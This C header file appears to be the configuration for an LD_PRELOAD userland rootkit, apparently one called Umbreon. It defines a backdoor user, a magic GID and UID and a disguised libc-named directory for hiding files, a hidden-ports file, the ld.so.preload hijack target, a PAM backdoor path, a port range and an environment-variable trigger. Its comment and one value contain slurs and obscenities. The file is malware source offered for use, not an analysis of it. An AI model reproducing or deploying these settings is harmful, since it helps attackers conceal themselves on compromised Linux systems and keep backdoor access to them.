/*
 DON'T EDIT THIS BY HAND UNLESS YOU ARE NOT RETARDED
 THE INSTALLER EDITS THIS FOR YOU
*/
#ifndef CONFIG_H
#define CONFIG_H
#define _STAT_VER 3
#ifdef __i386__
#define BUILD_ARCH "i686"
#endif
#ifdef __x86_64__
#define BUILD_ARCH "x86_64"
#endif
#ifdef __arm__
#define BUILD_ARCH "v6l"
#endif
/* PAM junk, generic-enough path will work on 98% of stuff */
#define HAVE_PAM
#define LIBPAM_PATH "libpam.so.0"

#define MAGIC_STRING "libc.so.2852418076"
#define MAGIC_GID 1949069214
#define MAGIC_UID 1949069214
#define HOMEDIR "/usr/lib/libc.so.28524180762852418076"

#define HIDEPORTS_FILE HOMEDIR"/hideports"


#define PROC_NET_TCP "/proc/net/tcp"
#define PROC_NET_TCP6 "/proc/net/tcp6"


#define CONFIG_FILE "ld.so.preload"


#define LOW_PORT 196
#define HIGH_PORT 198

/* PT initiation key */
#define BD_USER "umbreon"

#define ENV_VARIABLE "FUCKMYANUSDONGSYOULITTLEFUCKINGSLUTFACEPORNSTAR"

#define SHELL_MSG "\n"

#define SHELL_NAME MAGIC_STRING

#define LIBC_PATH "libc.so.6"
#endif
#define HOMEDIR "/usr/lib/libc.so.28524180762852418076"
#define BD_CRYPT_PASS ""
